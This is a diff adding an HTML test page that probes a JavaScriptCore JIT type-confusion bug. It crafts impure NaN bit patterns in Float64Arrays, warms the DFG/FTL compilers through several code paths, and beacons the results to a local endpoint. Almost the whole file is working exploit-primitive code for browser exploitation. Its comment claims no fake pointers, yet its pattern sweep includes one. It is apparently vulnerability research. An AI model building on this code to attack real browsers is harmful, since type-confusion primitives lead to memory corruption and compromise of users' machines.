@@ -1,0 +1,322 @@
+<!--
+  p604: DFG NaN confusion test (Exodus Intelligence Dec 2023 pattern)
+
+  THEORY: DFG compileGetByValOnFloatTypedArray uses boxDouble()
+  which subtracts NumberTag(0xfffe000000000000) without purifying NaN.
+  A crafted impure NaN in Float64Array:
+    bits 0xFFFE000000000002 → boxDouble → 0x0000000000000002 = null
+    bits 0xFFFE000000000007 → boxDouble → 0x0000000000000007 = true
+    bits 0xFFFE00000000000A → boxDouble → 0x000000000000000A = undefined
+
+  SAFE DISCRIMINATOR:
+  - Patched/not-vulnerable: reads return NaN (typeof "number")
+  - Vulnerable: reads return null/true/undefined (type confusion!)
+
+  ZERO CRASH RISK: All crafted NaN values decode to safe JS constants.
+  No fake pointers, no dereferencing.
+
+  PATHS TESTED:
+  A. Direct arr[0] via sink (avoids DFG return-type guards)
+  B. for...in enumeration (Exodus exact pattern via EnumeratorGetByVal)
+  C. forEach callback
+  D. Multiple NaN bit patterns
+
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p604</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P604-DFG-NAN-CONFUSION');
+
+  // === SECTION A: Direct indexed access via sink pattern ===
+  b('SEC-A:DIRECT-SINK');
+
+  try {
+    var buf = new ArrayBuffer(16);
+    var f64 = new Float64Array(buf);
+    var dv = new DataView(buf);
+
+    f64[0] = 1.1;
+    f64[1] = 2.2;
+
+    var sink = {val: 0};
+
+    // Sink pattern: store result in property to avoid DFG return-type guard
+    function directSink(arr, s) {
+      s.val = arr[0];
+    }
+
+    // Warmup: 12000 iterations to trigger FTL (FTL compiles after ~10000)
+    for (var w = 0; w < 12000; w++) {
+      sink.val = 0;
+      directSink(f64, sink);
+    }
+    b('A-WARMUP:val=' + String(sink.val) + ',type=' + typeof sink.val);
+
+    // --- Test 1: null pattern (0xFFFE000000000002) ---
+    dv.setUint32(0, 0x00000002, true);
+    dv.setUint32(4, 0xFFFE0000, true);
+
+    sink.val = 'SENTINEL';
+    directSink(f64, sink);
+
+    var r = sink.val;
+    b('A-NULL:type=' + typeof r + ',val=' + String(r) +
+      ',isNull=' + (r === null) + ',isNaN=' + (typeof r === 'number' && isNaN(r)));
+    if (r === null) b('★★★ A-NAN-CONFUSION-HIT ★★★');
+
+    // --- Test 2: true pattern (0xFFFE000000000007) ---
+    dv.setUint32(0, 0x00000007, true);
+    dv.setUint32(4, 0xFFFE0000, true);
+
+    sink.val = 'SENTINEL';
+    directSink(f64, sink);
+    r = sink.val;
+    b('A-TRUE:type=' + typeof r + ',val=' + String(r) +
+      ',isTrue=' + (r === true) + ',isNaN=' + (typeof r === 'number' && isNaN(r)));
+    if (r === true) b('★★★ A-TRUE-CONFUSION-HIT ★★★');
+
+    // --- Test 3: undefined pattern (0xFFFE00000000000A) ---
+    dv.setUint32(0, 0x0000000A, true);
+    dv.setUint32(4, 0xFFFE0000, true);
+
+    sink.val = 'SENTINEL';
+    directSink(f64, sink);
+    r = sink.val;
+    b('A-UNDEF:type=' + typeof r + ',val=' + String(r) +
+      ',isUndef=' + (r === undefined) + ',isNaN=' + (typeof r === 'number' && isNaN(r)));
+    if (r === undefined) b('★★★ A-UNDEF-CONFUSION-HIT ★★★');
+
+    // --- Control: pure NaN (0x7FF8000000000000) should always be NaN ---
+    dv.setUint32(0, 0x00000000, true);
+    dv.setUint32(4, 0x7FF80000, true);
+    sink.val = 'SENTINEL';
+    directSink(f64, sink);
+    r = sink.val;
+    b('A-PURENAN:type=' + typeof r + ',isNaN=' + (typeof r === 'number' && isNaN(r)));
+
+    // Restore normal value for next tests
+    f64[0] = 1.1;
+
+  } catch(ex) { b('A-ERR:' + ex.message); }
+
+  // === SECTION B: for...in enumeration (Exodus exact pattern) ===
+  b('SEC-B:FORIN-EXODUS');
+
+  try {
+    var buf2 = new ArrayBuffer(16);
+    var f64_2 = new Float64Array(buf2);
+    var dv2 = new DataView(buf2);
+
+    f64_2[0] = 3.3;
+    f64_2[1] = 4.4;
+
+    // Exodus pattern: enumObj starts as {x,y}, gets reassigned to [1]
+    // inside the loop. After first call, enumObj is [1].
+    // for...in over [1] yields key "0" → f64_2["0"] = f64_2[0]
+    var enumObj = {x: 1234, y: 5678};
+    var eSink = {x: 0};
+
+    function enumTrigger(arg, s) {
+      for (var i in enumObj) {
+        enumObj = [1];
+        var out = arg[i];
+        s.x = out;
+      }
+    }
+
+    // First call: teaches enumObj → [1] transition
+    enumTrigger(enumObj, eSink);
+    b('B-FIRST:x=' + String(eSink.x) + ',type=' + typeof eSink.x);
+
+    // Warmup with Float64Array (enumObj is now [1], key "0")
+    for (var w = 0; w < 12000; w++) {
+      enumObj = [1];
+      eSink.x = 0;
+      enumTrigger(f64_2, eSink);
+    }
+    b('B-WARMUP:x=' + String(eSink.x) + ',type=' + typeof eSink.x);
+
+    // --- Test: null pattern ---
+    dv2.setUint32(0, 0x00000002, true);
+    dv2.setUint32(4, 0xFFFE0000, true);
+
+    enumObj = [1];
+    eSink.x = 'SENTINEL';
+    enumTrigger(f64_2, eSink);
+
+    var er = eSink.x;
+    b('B-NULL:type=' + typeof er + ',val=' + String(er) +
+      ',isNull=' + (er === null) + ',isNaN=' + (typeof er === 'number' && isNaN(er)));
+    if (er === null) b('★★★ B-FORIN-NAN-CONFUSION-HIT ★★★');
+
+    // --- Test: true pattern ---
+    dv2.setUint32(0, 0x00000007, true);
+    dv2.setUint32(4, 0xFFFE0000, true);
+    enumObj = [1];
+    eSink.x = 'SENTINEL';
+    enumTrigger(f64_2, eSink);
+    er = eSink.x;
+    b('B-TRUE:type=' + typeof er + ',val=' + String(er) +
+      ',isTrue=' + (er === true));
+    if (er === true) b('★★★ B-FORIN-TRUE-CONFUSION-HIT ★★★');
+
+    // --- Test: undefined ---
+    dv2.setUint32(0, 0x0000000A, true);
+    dv2.setUint32(4, 0xFFFE0000, true);
+    enumObj = [1];
+    eSink.x = 'SENTINEL';
+    enumTrigger(f64_2, eSink);
+    er = eSink.x;
+    b('B-UNDEF:type=' + typeof er + ',val=' + String(er) +
+      ',isUndef=' + (er === undefined));
+    if (er === undefined) b('★★★ B-FORIN-UNDEF-CONFUSION-HIT ★★★');
+
+  } catch(ex) { b('B-ERR:' + ex.message); }
+
+  // === SECTION C: forEach callback path ===
+  b('SEC-C:FOREACH');
+
+  try {
+    var buf3 = new ArrayBuffer(8);
+    var f64_3 = new Float64Array(buf3);
+    var dv3 = new DataView(buf3);
+
+    f64_3[0] = 5.5;
+
+    var cSink = {val: 0};
+
+    function feRead(arr, s) {
+      arr.forEach(function(v) { s.val = v; });
+    }
+
+    for (var w = 0; w < 8000; w++) {
+      cSink.val = 0;
+      feRead(f64_3, cSink);
+    }
+    b('C-WARMUP:val=' + String(cSink.val));
+
+    dv3.setUint32(0, 0x00000002, true);
+    dv3.setUint32(4, 0xFFFE0000, true);
+
+    cSink.val = 'SENTINEL';
+    feRead(f64_3, cSink);
+    var cr = cSink.val;
+    b('C-NULL:type=' + typeof cr + ',val=' + String(cr) +
+      ',isNull=' + (cr === null) + ',isNaN=' + (typeof cr === 'number' && isNaN(cr)));
+    if (cr === null) b('★★★ C-FOREACH-NAN-CONFUSION-HIT ★★★');
+
+  } catch(ex) { b('C-ERR:' + ex.message); }
+
+  // === SECTION D: NaN pattern sweep ===
+  b('SEC-D:PATTERN-SWEEP');
+
+  try {
+    var buf4 = new ArrayBuffer(8);
+    var f64_4 = new Float64Array(buf4);
+    var dv4 = new DataView(buf4);
+
+    f64_4[0] = 7.7;
+    var dSink = {val: 0};
+
+    function patSink(arr, s) { s.val = arr[0]; }
+
+    for (var w = 0; w < 12000; w++) {
+      dSink.val = 0;
+      patSink(f64_4, dSink);
+    }
+
+    var patterns = [
+      {hi: 0xFFFE0000, lo: 0x00000000, label: 'false(0)'},
+      {hi: 0xFFFE0000, lo: 0x00000002, label: 'null'},
+      {hi: 0xFFFE0000, lo: 0x00000006, label: 'false'},
+      {hi: 0xFFFE0000, lo: 0x00000007, label: 'true'},
+      {hi: 0xFFFE0000, lo: 0x0000000A, label: 'undefined'},
+      {hi: 0xFFFE0000, lo: 0x12345678, label: 'fakeptr'},
+      {hi: 0x7FF80000, lo: 0x00000000, label: 'pureNaN'},
+      {hi: 0x7FF80000, lo: 0x00000001, label: 'impureNaN1'},
+      {hi: 0xFFF80000, lo: 0x00000000, label: 'negNaN'},
+      {hi: 0x7FF00000, lo: 0x00000001, label: 'sNaN'},
+    ];
+
+    var anyHit = false;
+    for (var p = 0; p < patterns.length; p++) {
+      dv4.setUint32(0, patterns[p].lo, true);
+      dv4.setUint32(4, patterns[p].hi, true);
+
+      dSink.val = 'SENTINEL';
+      patSink(f64_4, dSink);
+      var pv = dSink.val;
+
+      var desc = 'type=' + typeof pv + ',val=' + String(pv);
+      if (pv === null) desc += ',★NULL';
+      else if (pv === true) desc += ',★TRUE';
+      else if (pv === false) desc += ',★FALSE';
+      else if (pv === undefined) desc += ',★UNDEF';
+      else if (typeof pv !== 'number') desc += ',★NONNUM(' + typeof pv + ')';
+
+      if (typeof pv !== 'number') anyHit = true;
+
+      b('D-' + patterns[p].label + ':' + desc);
+    }
+
+    if (anyHit) {
+      b('★★★ PATTERN-SWEEP-CONFUSION-DETECTED ★★★');
+    } else {
+      b('D-ALL-NUMBER:all-patterns-returned-NaN(no-confusion)');
+    }
+
+  } catch(ex) { b('D-ERR:' + ex.message); }
+
+  // === SECTION E: Delayed re-test (DFG might OSR-exit and recompile) ===
+  b('SEC-E:DELAYED-RETEST');
+
+  // If DFG OSR-exited on first NaN, it recompiles with broader type info.
+  // After recompilation, the NaN path might be in the compiled code.
+  // Wait 500ms then re-test.
+  setTimeout(function() {
+    try {
+      var buf5 = new ArrayBuffer(8);
+      var f64_5 = new Float64Array(buf5);
+      var dv5 = new DataView(buf5);
+
+      f64_5[0] = 9.9;
+      var eSink2 = {val: 0};
+
+      function delSink(arr, s) { s.val = arr[0]; }
+
+      // Warmup with MIX of normal and NaN doubles
+      for (var w = 0; w < 6000; w++) {
+        if (w % 100 === 99) {
+          // Occasional NaN to teach DFG about the NaN case
+          dv5.setUint32(0, 0x00000000, true);
+          dv5.setUint32(4, 0x7FF80000, true);
+        } else {
+          f64_5[0] = w * 1.1;
+        }
+        eSink2.val = 0;
+        delSink(f64_5, eSink2);
+      }
+      b('E-WARMUP:lastVal=' + String(eSink2.val));
+
+      // Now crafted NaN after DFG has seen NaN values
+      dv5.setUint32(0, 0x00000002, true);
+      dv5.setUint32(4, 0xFFFE0000, true);
+
+      eSink2.val = 'SENTINEL';
+      delSink(f64_5, eSink2);
+      var ev = eSink2.val;
+      b('E-NULL:type=' + typeof ev + ',val=' + String(ev) +
+        ',isNull=' + (ev === null) + ',isNaN=' + (typeof ev === 'number' && isNaN(ev)));
+      if (ev === null) b('★★★ E-DELAYED-NAN-CONFUSION-HIT ★★★');
+
+    } catch(ex) { b('E-ERR:' + ex.message); }
+
+    b('P604-COMPLETE');
+  }, 500);
+}
+
+setTimeout(main, 100);
+</script></head><body>p604: DFG NaN confusion</body></html>
